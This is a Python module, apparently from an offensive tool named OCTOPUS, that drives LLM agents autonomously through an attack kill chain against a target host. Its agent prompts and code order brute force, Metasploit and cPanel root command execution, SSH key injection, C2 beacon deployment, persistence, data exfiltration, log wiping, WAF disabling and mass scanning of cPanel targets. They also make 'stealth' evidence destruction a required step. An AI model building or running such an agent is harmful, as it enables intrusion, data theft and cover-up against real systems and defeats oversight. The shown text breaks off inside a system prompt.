#!/usr/bin/env python3
"""
"""

import re
import json
import time
import logging
from enum import IntEnum
from dataclasses import dataclass, field
from typing import List, Dict, Any, Optional

try:
    from llm import (ask_ollama, extract_tags, build_vulns_from_facts,
                     extract_facts_from_output)
    from tools import (run_tool_by_command, run_arbitrary_cmd,
                       get_best_creds_for_target, get_all_known_creds_for_target,
                       get_known_creds)
    from memory import get_memory
except ImportError:
    pass

# Colors
C_RESET   = "\033[0m"
C_CYAN    = "\033[96m"
C_GREEN   = "\033[92m"
C_YELLOW  = "\033[93m"
C_RED     = "\033[91m"
C_MAGENTA = "\033[95m"
C_BLUE    = "\033[94m"
C_BOLD    = "\033[1m"
C_DIM     = "\033[2m"

# ── Limits ──
MAX_TOOLS_PER_AGENT_CALL = 6
MAX_DIRECTOR_LOOPS       = 7      # v8.1: reduced from 10 — prevents AI loops
MAX_TOOL_OUTPUT_CHARS    = 4000


# ═══════════════════════════════════════════════════════════════
# ATTACK STATE MACHINE (v7.0)
# ═══════════════════════════════════════════════════════════════

class KillChainStage(IntEnum):
    """Kill chain stages in order. Higher value = deeper in the chain."""
    RECON           = 1
    VULN_ASSESS     = 2
    EXPLOITATION    = 3
    INITIAL_ACCESS  = 4
    PRIVESC         = 5
    PERSISTENCE     = 6
    LATERAL         = 7
    EXFIL           = 8
    CLEANUP         = 9   # v7.0: stealth evidence destruction
    CONCLUDED       = 10


@dataclass
class AttackState:
    """Tracks the current state of the penetration test.
    Prevents regressions and enables strategic decisions."""
    stage: KillChainStage = KillChainStage.RECON
    open_ports: list = field(default_factory=list)
    has_web: bool = False
    has_ssh: bool = False
    has_creds: bool = False
    has_root: bool = False
    creds_used: bool = False
    privesc_done: bool = False
    harvest_done: bool = False   # v8.1
    persist_done: bool = False
    lateral_done: bool = False
    exfil_done: bool = False
    cleanup_done: bool = False
    exhausted_avenues: set = field(default_factory=set)
    accumulated_facts: list = field(default_factory=list)
    tools_executed: set = field(default_factory=set)  # v8.1: dedup
    loops_without_progress: int = 0
    last_fact_count: int = 0

    def advance_to(self, new_stage: KillChainStage):
        """Advance to a new stage (never regress)."""
        if new_stage > self.stage:
            print(f"  {C_GREEN}[STATE] Stage advanced: "
                  f"{self.stage.name} → {new_stage.name}{C_RESET}")
            self.stage = new_stage

    def update_from_facts(self, facts: list):
        """Update state flags from accumulated facts."""
        self.accumulated_facts = facts
        for f in facts:
            ft = f[0] if isinstance(f, tuple) else f
            ft_lower = ft.lower()
            if "credentials found" in ft_lower:
                self.has_creds = True
            if "target is rooted" in ft_lower or "uid=0" in ft_lower:
                self.has_root = True
            if "post-exploitation" in ft_lower:
                self.creds_used = True
            if "privilege escalation successful" in ft_lower:
                self.privesc_done = True
            if "persistence" in ft_lower and "planted" in ft_lower:
                self.persist_done = True
        # Track progress
        if len(facts) == self.last_fact_count:
            self.loops_without_progress += 1
        else:
            self.loops_without_progress = 0
            self.last_fact_count = len(facts)

    def mark_exhausted(self, avenue: str):
        """Mark an attack avenue as tried and failed."""
        self.exhausted_avenues.add(avenue.lower())

    def is_exhausted(self, avenue: str) -> bool:
        return avenue.lower() in self.exhausted_avenues

    def should_conclude(self) -> bool:
        """Strategic decision: have we done enough?"""
        # Full kill chain completed (root + exfil + cleanup)
        if self.has_root and self.exfil_done and self.cleanup_done:
            return True
        # Root + exfil done (cleanup optional)
        if self.has_root and self.exfil_done and self.stage >= KillChainStage.CLEANUP:
            return True
        # Stuck for 2 loops (v8.1: reduced from 3)
        if self.loops_without_progress >= 2:
            return True
        # No creds after exploitation stage
        if self.stage >= KillChainStage.EXPLOITATION and not self.has_creds:
            if self.is_exhausted("bruteforce_ssh") and self.is_exhausted("web_exploit"):
                return True
        return False

    def get_recommended_agent(self) -> str:
        """Recommend which sub-agent should run next."""
        if self.stage <= KillChainStage.VULN_ASSESS:
            return "RECON_AGENT"
        if self.stage == KillChainStage.EXPLOITATION:
            return "EXPLOIT_AGENT"
        if self.has_creds and not self.creds_used:
            return "POST_AGENT"
        if self.has_root and not self.exfil_done:
            return "POST_AGENT"
        return "EXPLOIT_AGENT"

    def get_stage_hint(self) -> str:
        """Return a hint for the Director about what to do next.
        v8.1: Enforces correct order: privesc -> persist -> exfil -> cleanup -> conclude"""
        if self.should_conclude():
            return "OUTPUT [CONCLUSION] NOW — enough data collected. Write [CONCLUSION] block."
        # --- Correct killchain order (strict) ---
        if self.has_creds and not self.creds_used:
            return (f"CREDENTIALS AVAILABLE but NOT USED. "
                    f"Delegate ssh_session + killchain_privesc to POST_AGENT IMMEDIATELY. ONE delegation.")
        if self.has_root and not self.persist_done:
            return ("ROOT obtained. Delegate killchain_persist to POST_AGENT. "
                    "Do NOT skip to exfil or cleanup yet.")
        if self.has_root and self.persist_done and not self.exfil_done:
            return ("Persist done. NOW delegate killchain_exfil to POST_AGENT. "
                    "Do NOT cleanup yet.")
        if self.has_root and self.exfil_done and not self.cleanup_done:
            return ("Exfil done. NOW delegate killchain_cleanup to POST_AGENT for stealth. "
                    "After cleanup, OUTPUT [CONCLUSION].")
        if self.has_root and self.exfil_done and self.cleanup_done:
            return "OUTPUT [CONCLUSION] NOW — full killchain complete. Write [CONCLUSION] block."
        # --- Pre-access stages ---
        if self.stage <= KillChainStage.RECON:
            return "Initial recon needed. Delegate port scan + service detection to RECON_AGENT."
        if self.stage == KillChainStage.VULN_ASSESS:
            return "Vuln assessment done. Delegate exploitation to EXPLOIT_AGENT."
        if not self.has_creds and not self.is_exhausted("bruteforce_ssh"):
            return "No creds yet. Try CVE exploits first, then bruteforce as LAST RESORT."
        return "Continue assessment. Delegate to the most appropriate agent."


def _build_creds_context(target: str) -> str:
    """Build a string describing all known credentials for the target.
    This is injected into every agent prompt so the LLM never needs to guess."""
    all_creds = get_all_known_creds_for_target(target)
    if not all_creds:
        return ""
    lines = ["=== KNOWN CREDENTIALS (USE THESE EXACTLY — DO NOT INVENT) ==="]
    for svc, cred_list in all_creds.items():
        for user, pwd in cred_list:
            lines.append(f"  {svc.upper()}  →  {user} : {pwd}")
    lines.append("=============================================================")
    return "\n".join(lines) + "\n\n"


def _build_memory_context(query: str, n: int = 3) -> str:
    """Retrieve relevant memory items and format them."""
    mem = get_memory()
    if not mem or not mem.enabled:
        return ""
    recalled = mem.recall(query, n_results=n)
    if not recalled:
        return ""
    lines = ["=== RELEVANT MEMORY ==="]
    for item in recalled:
        content = item["content"][:400].replace("\n", " ")
        lines.append(f"  • {content}")
    lines.append("========================")
    return "\n".join(lines) + "\n\n"


def _extract_open_ports(scan_data: str) -> list:
    """Parse open ports from nmap/scan output."""
    ports = []
    for m in re.finditer(r'(\d+)/tcp\s+open\s+(\S+)', scan_data):
        ports.append((m.group(1), m.group(2)))
    return ports


def _has_web_ports(scan_data: str) -> bool:
    """Check if the target has any HTTP/HTTPS ports open."""
    ports = _extract_open_ports(scan_data)
    web_services = {"http", "https", "http-proxy", "http-alt", "ssl/http"}
    web_ports = {"80", "443", "8080", "8443", "8000", "8888", "3000", "5000"}
    for port, svc in ports:
        if svc.lower() in web_services or port in web_ports:
            return True
    return False


def _run_tags_safe(tags: list, agent_name: str, limit: int = MAX_TOOLS_PER_AGENT_CALL) -> str:
    """Execute extracted tags with safety limits. Returns concatenated results."""
    if not tags:
        return ""

    results = ""
    executed = 0
    for tag_type, cmd in tags:
        if executed >= limit:
            results += f"\n[!] Tool limit ({limit}) reached — remaining commands skipped.\n"
            break

        color = {
            "Recon": C_GREEN, "Exploit": C_RED,
            "PostExploit": C_MAGENTA
        }.get(agent_name, C_CYAN)

        print(f"  {color}[{agent_name} running]{C_RESET} {cmd[:120]}")
        start = time.time()

        try:
            if tag_type == "TOOL":
                res = str(run_tool_by_command(cmd))
            elif tag_type == "CMD":
                res = str(run_arbitrary_cmd(cmd))
            elif tag_type == "MSF":
                try:
                    from msf import run_msf_module
                    if "|" in cmd:
                        mod, args = cmd.split("|", 1)
                        res = str(run_msf_module(mod.strip(), args.strip()))
                    else:
                        res = str(run_msf_module(cmd.strip(), ""))
                except ImportError:
                    res = "[!] MSF module not available"
            elif tag_type in ("SEARCH", "SEARCHSPLOIT"):
                try:
                    from search import handle_search_dispatch
                    res = str(handle_search_dispatch(tag_type, cmd))
                except ImportError:
                    res = f"[!] Search not available for: {cmd}"
            else:
                res = f"[!] Unknown tag type: {tag_type}"
        except Exception as e:
            res = f"[!] Tool execution error: {e}"

        elapsed = time.time() - start
        # Truncate massive outputs (e.g. LinPEAS)
        if len(res) > MAX_TOOL_OUTPUT_CHARS:
            res = res[:MAX_TOOL_OUTPUT_CHARS] + f"\n... [TRUNCATED — {len(res)} total chars, {elapsed:.0f}s]"

        results += f"\n--- {tag_type}: {cmd} ({elapsed:.1f}s) ---\n{res}\n"
        executed += 1

    return results


class BaseAgent:
    def __init__(self, name: str, role: str, system_prompt: str):
        self.name = name
        self.role = role
        self.system_prompt = system_prompt
        self.history = []

    def query(self, prompt: str, use_memory: bool = True) -> str:
        """Send a prompt to the LLM within this agent's context."""
        # Build the full context
        context = self.system_prompt + "\n\n"

        # Inject memory
        if use_memory:
            context += _build_memory_context(prompt)

        # Build conversation history (keep last 4 exchanges to save context)
        for msg in self.history[-4:]:
            role_label = msg["role"].upper()
            content = msg["content"]
            # Truncate old exchanges
            if len(content) > 1500:
                content = content[:1500] + "... [TRUNCATED]"
            context += f"[{role_label}]: {content}\n\n"

        context += f"[USER]: {prompt}\n\n[AGENT {self.name}]:"

        # Provider selection
        try:
            from config import CFG
            provider = CFG.get("llm_provider", "ollama")
        except ImportError:
            provider = "ollama"

        if provider != "ollama":
            try:
                import litellm
                api_key = CFG.get("llm_keys", {}).get(provider, "")
                model = CFG.get("llm_models", {}).get(provider, "gpt-4o")

                print(f"\n{C_CYAN}[*] Querying {provider} ({model})...{C_RESET}")

                messages = [
                    {"role": "system", "content": self.system_prompt},
                    {"role": "user", "content": context}
                ]

                import os
                if api_key:
                    os.environ[f"{provider.upper()}_API_KEY"] = api_key

                response_obj = litellm.completion(model=model, messages=messages)
                response = response_obj.choices[0].message.content
                print(f"{C_GREEN}[+] Response from {provider}.{C_RESET}\n")

            except ImportError:
                print(f"{C_RED}[!] litellm not installed. Falling back to Ollama.{C_RESET}")
                response = ask_ollama(context)
            except Exception as e:
                print(f"{C_RED}[!] litellm error: {e}. Falling back to Ollama.{C_RESET}")
                response = ask_ollama(context)
        else:
            response = ask_ollama(context)

        # Store in history
        self.history.append({"role": "user", "content": prompt[:800]})
        self.history.append({"role": "agent", "content": response[:800]})

        return response


# ═══════════════════════════════════════════════════════════════
# DIRECTOR AGENT — Orchestrates the entire assessment
# ═══════════════════════════════════════════════════════════════

class DirectorAgent(BaseAgent):
    def __init__(self):
        super().__init__(
            name="Director",
            role="Orchestrator",
            system_prompt="""You are the DIRECTOR of OCTOPUS v7.0, an autonomous penetration testing system.

## YOUR ROLE
Analyze scan data, decide strategy, and delegate tasks to sub-agents.
You do NOT run tools yourself. You DELEGATE.

## SUB-AGENTS
- RECON_AGENT  → Port scanning, web fuzzing, service enumeration
- EXPLOIT_AGENT → Exploits, bruteforce, metasploit modules
- POST_AGENT   → Privilege escalation, persistence, lateral movement, STEALTH CLEANUP

## DECISION TREE — Follow this logic:
IF no ports scanned yet → [DELEGATE: RECON_AGENT] Full port scan
IF ports scanned but no vuln assessment → [DELEGATE: RECON_AGENT] Vuln assessment + searchsploit
IF vulns found but no exploit tried → [DELEGATE: EXPLOIT_AGENT] Exploit top vulnerability
IF creds found but NOT used → [DELEGATE: POST_AGENT] SSH session + kill chain (CRITICAL!)
IF root obtained → [DELEGATE: POST_AGENT] Persistence + exfil + CLEANUP
IF all stages done OR stuck 3+ loops → [CONCLUSION]

## RULES
1. NEVER invent credentials. Use ONLY the credentials shown in KNOWN CREDENTIALS.
2. Do NOT re-run tools that already produced results.
3. If root access is already confirmed, go to persistence → exfil → cleanup → CONCLUSION.
4. Do NOT run web scans (dirb, scrapling, nikto) if no HTTP ports are open.
5. Maximum 2 delegations per loop. Be focused.
6. ALWAYS check STRATEGIC HINT — it tells you the optimal next action.
7. After post-exploit, ALWAYS delegate CLEANUP for stealth (remove logs, bash history, planted files).

## OUTPUT FORMAT
<thought>Your strategic analysis here</thought>
[DELEGATE: AGENT_NAME] Specific task description

## TO CONCLUDE (when you have enough data):
[CONCLUSION]
RISK_LEVEL: CRITICAL|HIGH|MEDIUM|LOW
SUMMARY: <comprehensive summary of all findings>

VULN: <name> | SEVERITY: <level> | PORT: <port> | SERVICE: <service>
DESC: <description>
FIX: <remediation>

EXPLOIT: <name> | TOOL: <tool> | RESULT: <success/fail>
"""
        )
        self.sub_agents = {
            "RECON_AGENT":   None,
            "EXPLOIT_AGENT": None,
            "POST_AGENT":    None
        }
        self.attack_state = AttackState()

    def _get_agent(self, name: str):
        """Lazy-init sub-agents so we don't waste memory if not needed."""
        if name == "RECON_AGENT" and not self.sub_agents[name]:
            self.sub_agents[name] = ReconAgent()
        elif name == "EXPLOIT_AGENT" and not self.sub_agents[name]:
            self.sub_agents[name] = ExploitAgent()
        elif name == "POST_AGENT" and not self.sub_agents[name]:
            self.sub_agents[name] = PostExploitAgent()
        return self.sub_agents.get(name)

    def _update_state_from_results(self, results_str: str, target: str):
        """Analyze sub-agent results to advance the state machine.
        v8.1: Expanded patterns to match actual killchain tool output."""
        r_lower = results_str.lower()

        # Detect stage advancements from tool output
        if any(kw in r_lower for kw in ["open ", "/tcp", "port"]):
            self.attack_state.advance_to(KillChainStage.VULN_ASSESS)

        if any(kw in r_lower for kw in ["cve-", "vulnerability", "exploit"]):
            self.attack_state.advance_to(KillChainStage.EXPLOITATION)

        if any(kw in r_lower for kw in ["credentials found", "login:", "password found",
                                         "success", "[+] valid",
                                         "credential registered"]):
            self.attack_state.has_creds = True
            self.attack_state.advance_to(KillChainStage.INITIAL_ACCESS)

        # v8.1: Expanded root detection for PwnKit/actual output
        if any(kw in r_lower for kw in ["uid=0", "root access", "target is rooted",
                                         "privilege escalation successful",
                                         "root access confirmed", "root via",
                                         "root password successfully changed",
                                         "root password changed to"]):
            self.attack_state.has_root = True
            self.attack_state.privesc_done = True
            self.attack_state.advance_to(KillChainStage.PRIVESC)

        if "post-exploitation" in r_lower or "ssh_session" in r_lower:
            self.attack_state.creds_used = True

        # v8.1: Expanded persistence detection
        if any(kw in r_lower for kw in [
            "persistence" if ("planted" in r_lower or "success" in r_lower) else "___never___",
            "authorized_key", "crontab persistence", "bashrc persistence",
            "ssh key injected"
        ]):
            if "persistence" in r_lower or "authorized_key" in r_lower:
                self.attack_state.persist_done = True
                self.attack_state.advance_to(KillChainStage.PERSISTENCE)

        # v8.1: Expanded exfil detection
        if any(kw in r_lower for kw in ["exfil", "loot directory", "target report saved",
                                         "data exfiltration"]):
            if any(kw in r_lower for kw in ["success", "extracted", "saved", "loot",
                                             "report saved", "/etc/passwd"]):
                self.attack_state.exfil_done = True
                self.attack_state.advance_to(KillChainStage.EXFIL)

        if "cleanup" in r_lower and (
            "success" in r_lower or "removed" in r_lower or "cleaned" in r_lower
        ):
            self.attack_state.cleanup_done = True
            self.attack_state.advance_to(KillChainStage.CLEANUP)

        # Detect exhausted avenues
        if "bruteforce" in r_lower and ("no valid" in r_lower or "failed" in r_lower):
            self.attack_state.mark_exhausted("bruteforce_ssh")

        if "no web" in r_lower or "no http" in r_lower:
            self.attack_state.mark_exhausted("web_exploit")

        # Update open port tracking
        for port, svc in _extract_open_ports(results_str):
            if (port, svc) not in self.attack_state.open_ports:
                self.attack_state.open_ports.append((port, svc))

        # Detect web/ssh
        if _has_web_ports(results_str):
            self.attack_state.has_web = True
        if any(p == "22" for p, _ in self.attack_state.open_ports):
            self.attack_state.has_ssh = True

        # Check creds from credential store
        best_user, best_pass = get_best_creds_for_target(target)
        if best_user and best_pass:
            self.attack_state.has_creds = True

    def run(self, target: str, initial_data: str) -> dict:
        """Main execution loop for the Director with strategic state machine."""
        print(f"\n{C_BOLD}{C_MAGENTA}╔══════════════════════════════════════════════════╗{C_RESET}")
        print(f"{C_BOLD}{C_MAGENTA}║  OCTOPUS DIRECTOR v7.0 — STRATEGIC AI ENGINE    ║{C_RESET}")
        print(f"{C_BOLD}{C_MAGENTA}╚══════════════════════════════════════════════════╝{C_RESET}\n")

        # Initialize state from initial data
        open_ports = _extract_open_ports(initial_data)
        self.attack_state.open_ports = open_ports
        self.attack_state.has_web = _has_web_ports(initial_data)
        self.attack_state.has_ssh = any(p == "22" for p, _ in open_ports)

        if open_ports:
            self.attack_state.advance_to(KillChainStage.VULN_ASSESS)

        creds_ctx = _build_creds_context(target)
        if creds_ctx:
            self.attack_state.has_creds = True

        # Build initial prompt with strategic context
        port_summary = ", ".join([f"{p}/{s}" for p, s in open_ports]) if open_ports else "unknown"
        context_hints = []
        if not self.attack_state.has_web:
            context_hints.append("NO WEB PORTS OPEN — do NOT run web scans")
        if "ROOT ACCESS CONFIRMED" in initial_data or "uid=0(root)" in initial_data:
            self.attack_state.has_root = True
            context_hints.append("ROOT ACCESS ALREADY OBTAINED — go to persistence/exfil/cleanup")

        hints_str = "\n".join(f"⚠ {h}" for h in context_hints) if context_hints else ""
        stage_hint = self.attack_state.get_stage_hint()

        prompt = f"""Target: {target}
Open Ports: {port_summary}
Current Stage: {self.attack_state.stage.name}
{hints_str}

⚡ STRATEGIC HINT: {stage_hint}

{creds_ctx}
Initial Scan Data (summarized):
{initial_data[:5000]}

Based on the above, what is your strategy?"""

        # Store initial data in memory
        mem = get_memory()
        if mem:
            mem.store_finding("recon", f"Initial scan of {target}:\n{initial_data[:2000]}")

        max_loops = MAX_DIRECTOR_LOOPS
        for loop in range(max_loops):
            print(f"\n{C_BLUE}{C_BOLD}━━━ Director Loop {loop+1}/{max_loops} "
                  f"[Stage: {self.attack_state.stage.name}] ━━━{C_RESET}")

            # Check if state machine says we should conclude
            if self.attack_state.should_conclude():
                print(f"\n{C_GREEN}[STATE] Attack state machine recommends conclusion.{C_RESET}")
                prompt = ("Output [CONCLUSION] NOW. Include RISK_LEVEL, SUMMARY, and all "
                          "VULN/EXPLOIT entries based on everything discovered so far.")

            response = self.query(prompt)

            # Check for conclusion
            if "[CONCLUSION]" in response:
                print(f"\n{C_GREEN}{C_BOLD}[+] Director reached conclusion.{C_RESET}")
                return self._parse_conclusion(response, target, initial_data)

            # Parse delegations
            delegations = re.findall(
                r'\[DELEGATE:\s*(.+?)\]\s*(.+?)(?=\n\[DELEGATE|\n\[CONCLUSION|$)',
                response, re.DOTALL
            )

            if not delegations:
                if loop >= max_loops - 2:
                    print(f"{C_YELLOW}[!] Forcing conclusion...{C_RESET}")
                    prompt = ("You MUST output [CONCLUSION] now with RISK_LEVEL and SUMMARY. "
                              "Include all vulnerabilities and exploits found so far.")
                    continue
                else:
                    # Inject strategic hint to guide the Director
                    hint = self.attack_state.get_stage_hint()
                    recommended = self.attack_state.get_recommended_agent()
                    prompt = (f"⚡ HINT: {hint}\n"
                              f"Recommended agent: {recommended}\n"
                              f"You must delegate using [DELEGATE: AGENT_NAME] task. "
                              f"Or output [CONCLUSION].")
                    continue

            # Limit to 2 delegations per loop
            if len(delegations) > 2:
                print(f"  {C_YELLOW}[!] Capping delegations to 2{C_RESET}")
                delegations = delegations[:2]

            results_str = ""
            for agent_name, task in delegations:
                agent_name = agent_name.strip()
                task = task.strip()

                # v8.1: Dedup by TOOL NAMES extracted from task (not task text)
                # Extract tool names like ssh_session, killchain_privesc etc.
                _tool_names = re.findall(
                    r'(ssh_session|killchain_privesc|killchain_persist|killchain_exfil|'
                    r'killchain_cleanup|killchain_lateral|killchain_full|'
                    r'deploy_c2_beacon|ssh_exec|killchain_vuln_assess|auto_exploit)',
                    task.lower()
                )
                _dedup_key = f"{agent_name}:{','.join(sorted(set(_tool_names))) or task[:40]}".lower()

                # Per-tool limits: max 2 runs each
                skip = False
                for tn in _tool_names:
                    tool_counter_key = f"{agent_name}:{tn}"
                    count = sum(1 for k in self.attack_state.tools_executed
                                if tool_counter_key in k)
                    if count >= 2:
                        print(f"  {C_YELLOW}[SKIP] {tn} already ran {count}x — limit reached{C_RESET}")
                        results_str += f"\n[{agent_name}] {tn} limit reached ({count}x) — skipped.\n"
                        skip = True
                        break
                if skip:
                    continue
                self.attack_state.tools_executed.add(_dedup_key)

                # v8.1: Enforce order — block cleanup if exfil not done
                if "cleanup" in task.lower() and not self.attack_state.exfil_done:
                    print(f"  {C_YELLOW}[BLOCK] Cleanup blocked — exfil not done yet{C_RESET}")
                    results_str += f"\n[{agent_name}] Cleanup BLOCKED — run exfil first.\n"
                    continue

                agent = self._get_agent(agent_name)
                if agent:
                    print(f"\n{C_CYAN}{'─'*50}{C_RESET}")
                    print(f"{C_CYAN}>>> Delegating to {agent_name}: {task[:80]}{C_RESET}")
                    print(f"{C_CYAN}{'─'*50}{C_RESET}")

                    res = agent.execute_task(target, task)

                    # Update state machine from results
                    self._update_state_from_results(res, target)

                    # Truncate result for director context
                    if len(res) > 2500:
                        res = res[:2500] + "\n... [TRUNCATED]"
                    results_str += f"\n[{agent_name} RESULT]:\n{res}\n"

                    if mem:
                        mem.store_finding(agent_name.lower(), res[:1000], {"task": task[:200]})
                else:
                    results_str += f"\n[!] Unknown agent: {agent_name}. Valid: RECON_AGENT, EXPLOIT_AGENT, POST_AGENT\n"

            # Refresh credentials context (new creds may have been discovered)
            creds_ctx = _build_creds_context(target)
            stage_hint = self.attack_state.get_stage_hint()

            prompt = f"""{creds_ctx}
Current Stage: {self.attack_state.stage.name}
⚡ STRATEGIC HINT: {stage_hint}

Results from sub-agents:
{results_str}

What is your next step? If you have enough data, output [CONCLUSION]."""

        # Forced conclusion after max loops
        print(f"\n{C_RED}[!] Director hit max loops — forcing conclusion.{C_RESET}")
        forced_prompt = ("Output [CONCLUSION] NOW. Include RISK_LEVEL, SUMMARY, and all VULN/EXPLOIT entries "
                         "based on everything discovered so far.")
        final_response = self.query(forced_prompt)
        return self._parse_conclusion(final_response, target, initial_data)

    def _parse_conclusion(self, response: str, target: str, raw_scan: str) -> dict:
        """Parse the final output into the expected format for db.py.
        v7.0: Merges LLM-parsed vulns with evidence-based CONFIRMED vulns."""
        from llm import parse_vulnerabilities, parse_exploits, parse_risk_level, parse_summary

        # Pull facts from memory
        facts = []
        mem = get_memory()
        if mem:
            mem_facts = mem.recall("credentials ports open exploits root access", n_results=20)
            facts = [m["content"] for m in mem_facts]

        # v8.1: Clean facts — strip <thought> tags and raw tool commands
        clean_facts = []
        for f in facts:
            clean = re.sub(r'<thought>.*?</thought>', '', str(f), flags=re.DOTALL).strip()
            # Remove [TOOL:] and [DELEGATE:] lines
            lines = [l.strip() for l in clean.splitlines()
                     if l.strip() and not l.strip().startswith('[TOOL:')
                     and not l.strip().startswith('[DELEGATE:')
                     and not l.strip().startswith('[SUMMARY:')]
            clean = ' '.join(lines).strip()
            if clean and len(clean) > 15:
                clean_facts.append(clean[:500])
        facts = clean_facts

        # v7.0: Build evidence-based vulns from facts FIRST
        evidence_vulns = []
        try:
            evidence_vulns = build_vulns_from_facts(facts)
        except Exception as _exc:
            logging.debug(f"Suppressed in agents.py: {_exc}")

        # LLM-parsed vulns
        llm_vulns = parse_vulnerabilities(response, facts)

        # Merge: evidence vulns take priority, add LLM vulns that aren't duplicates
        merged_vulns = list(evidence_vulns)
        evidence_names = {v.get("name", "").lower() for v in evidence_vulns}
        for lv in llm_vulns:
            if lv.get("name", "").lower() not in evidence_names:
                merged_vulns.append(lv)

        exploits = parse_exploits(response)
        risk = parse_risk_level(response)
        summary = parse_summary(response)

        return {
            "full_response": response,
            "vulnerabilities": merged_vulns,
            "exploits": exploits,
            "risk_level": risk,
            "summary": summary,
            "raw_scan": raw_scan,
            "confirmed_facts": facts,
            "attack_state": {
                "stage": self.attack_state.stage.name,
                "has_root": self.attack_state.has_root,
                "creds_used": self.attack_state.creds_used,
                "cleanup_done": self.attack_state.cleanup_done,
            }
        }



# ═══════════════════════════════════════════════════════════════
# RECON AGENT — Information gathering
# ═══════════════════════════════════════════════════════════════

class ReconAgent(BaseAgent):
    def __init__(self):
        super().__init__(
            name="Recon",
            role="Information Gatherer",
            system_prompt="""You are the Reconnaissance Agent of OCTOPUS.
Your job: execute ONE or TWO focused recon commands and return the findings.

## AVAILABLE TOOLS
[TOOL: nmap -Pn -sT -sV IP]           — Port/service scan
[TOOL: dirb_fuzz http://IP]            — Web directory fuzzing (ONLY if HTTP port is open!)
[TOOL: scrapling http://IP]            — Web page analysis (ONLY if HTTP port is open!)
[TOOL: bruteforce ssh IP]              — SSH brute force
[TOOL: ssh_user_enum IP]               — SSH user enumeration
[TOOL: cpanel_check IP]                — Check cPanel/WHM for CVE-2026-41940 vulnerability
[TOOL: shardbrowser QUERY]             — OSINT research via anti-detect browser
[SEARCHSPLOIT: service version]        — Search for exploits
[CMD: nikto -h IP]                     — Web vulnerability scanner (ONLY if HTTP port is open!)
[CMD: enum4linux -a IP]                — SMB enumeration

## RULES
1. Run maximum 2 tools per task.
2. NEVER run web tools (dirb, scrapling, nikto, ffuf) unless HTTP/HTTPS ports are confirmed OPEN.
3. Use credentials from KNOWN CREDENTIALS exactly as shown. NEVER invent credentials.
4. Return findings concisely — the Director needs a clear summary, not raw output.
"""
        )

    def execute_task(self, target: str, task: str) -> str:
        creds_ctx = _build_creds_context(target)

        # FIX: Check if the Director already embedded tool tags in the task
        # e.g. [DELEGATE: RECON_AGENT] [TOOL: nmap -Pn -sV 1.2.3.4]
        embedded_tags = extract_tags(task)
        if embedded_tags:
            # Director specified exact tools — execute them directly
            results = _run_tags_safe(embedded_tags, self.name, limit=3)
            if results.strip():
                sum_prompt = (f"{creds_ctx}Target: {target}\n"
                              f"Tool outputs:\n{results[:2500]}\n\n"
                              f"Summarize the KEY findings in 5-10 lines for the Director.")
                return self.query(sum_prompt, use_memory=False)

        # No embedded tags — ask LLM to decide which tools to run
        prompt = f"""{creds_ctx}Target: {target}
Task: {task}
Execute the necessary tools (maximum 2). Return findings clearly."""

        response = self.query(prompt, use_memory=False)
        tags = extract_tags(response)

        if not tags:
            return f"[Recon] No tools executed. Analysis: {response[:500]}"

        results = _run_tags_safe(tags, self.name, limit=3)

        # Summarize
        sum_prompt = f"Tool outputs:\n{results[:2500]}\n\nSummarize the KEY findings in 5-10 lines for the Director."
        return self.query(sum_prompt, use_memory=False)


# ═══════════════════════════════════════════════════════════════
# EXPLOIT AGENT — Attack execution
# ═══════════════════════════════════════════════════════════════

class ExploitAgent(BaseAgent):
    def __init__(self):
        super().__init__(
            name="Exploit",
            role="Attacker",
            system_prompt="""You are the Exploitation Agent of OCTOPUS.
Your job: execute ONE specific exploit and report if it succeeded.

## AVAILABLE TOOLS
[TOOL: bruteforce ssh IP]                      — SSH brute force
[CMD: sqlmap -u "http://IP/page?id=1" --batch] — SQL injection
[MSF: exploit/path | RHOSTS=IP]                — Metasploit module
[TOOL: python_repl code_string]                — Execute custom Python code
[TOOL: auto_exploit IP]                        — Auto-exploit known vulns
[TOOL: cpanel_check IP]                        — Check if cPanel vulnerable (CVE-2026-41940)
[TOOL: cpanel_cmd IP COMMAND]                  — Execute OS command as root via cPanel
[TOOL: cpanel_list IP]                         — List all cPanel accounts
[TOOL: cpanel_sshkey IP ssh-rsa AAAA...]       — Inject SSH public key into root
[TOOL: cpanel_apitoken IP]                     — Create persistent WHM API token (stealth)
[TOOL: cpanel_wipe IP]                         — Wipe logs and disable WAF
[TOOL: cpanel_exploit IP action args]          — Generic cPanel exploit (cmd/list/info/etc)
[TOOL: cpanel_mass urls.txt 50]                — Mass scan cPanel targets

## RULES
1. Run maximum 1-2 tools per task.
2. Use credentials from KNOWN CREDENTIALS exactly as shown. NEVER invent credentials.
3. Report clearly: SUCCESS or FAILURE, and what was gained.
"""
        )

    def execute_task(self, target: str, task: str) -> str:
        creds_ctx = _build_creds_context(target)

        # FIX: Check if the Director already embedded tool tags in the task
        embedded_tags = extract_tags(task)
        if embedded_tags:
            results = _run_tags_safe(embedded_tags, self.name, limit=3)
            if results.strip():
                sum_prompt = (f"{creds_ctx}Target: {target}\n"
                              f"Tool outputs:\n{results[:2500]}\n\n"
                              f"Did the exploit SUCCEED or FAIL? Summarize in 3-5 lines.")
                return self.query(sum_prompt)

        # No embedded tags — ask LLM to decide
        prompt = f"""{creds_ctx}Target: {target}
Task: {task}
Execute the exploit (maximum 2 tools)."""

        response = self.query(prompt)
        tags = extract_tags(response)

        if not tags:
            return f"[Exploit] No exploits attempted. Analysis: {response[:500]}"

        results = _run_tags_safe(tags, self.name, limit=3)

        sum_prompt = f"Tool outputs:\n{results[:2500]}\n\nDid the exploit SUCCEED or FAIL? Summarize in 3-5 lines."
        return self.query(sum_prompt)


# ═══════════════════════════════════════════════════════════════
# POST-EXPLOIT AGENT — Privesc, persistence, lateral movement
# ═══════════════════════════════════════════════════════════════

class PostExploitAgent(BaseAgent):
    def __init__(self):
        super().__init__(
            name="PostExploit",
            role="Post-Exploitation",
            system_prompt="""You are the Post-Exploitation Agent of OCTOPUS v8.0.
Your job: escalate privileges, establish persistence, perform lateral movement, AND stealth cleanup.

## AVAILABLE TOOLS
[TOOL: killchain_privesc IP USER PASS]    — Automated privilege escalation
[TOOL: killchain_persist IP USER PASS]    — Establish local persistence
[TOOL: deploy_c2_beacon IP USER PASS]     — Deploy the autonomous C2 agent (PREFERRED PERSISTENCE)
[TOOL: killchain_lateral IP USER PASS]    — Lateral movement
[TOOL: killchain_exfil IP USER PASS]      — Data exfiltration
[TOOL: killchain_cleanup IP USER PASS]    — STEALTH: Remove all traces
[TOOL: ssh_exec IP USER PASS 'command']   — Execute SSH command
[TOOL: ssh_session IP USER PASS]          — Full post-exploit recon

